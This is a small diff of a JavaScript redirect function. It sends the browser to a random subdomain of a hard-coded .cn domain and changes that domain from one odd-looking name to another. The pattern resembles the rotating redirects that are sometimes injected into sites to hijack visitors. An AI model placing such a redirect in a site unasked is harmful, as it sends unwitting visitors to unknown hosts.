@@ -17,7 +17,7 @@ function generateRandomString(length) {
 // 执行重定向操作
 function redirectToDomain() {
   var randomString = generateRandomString(10);
-  var domain = '2022qazwsx081.cn';
+  var domain = 'zmuiblx.cn';
   var redirectURL = 'http://' + randomString + '.' + domain;
   window.location.href = redirectURL;
 }
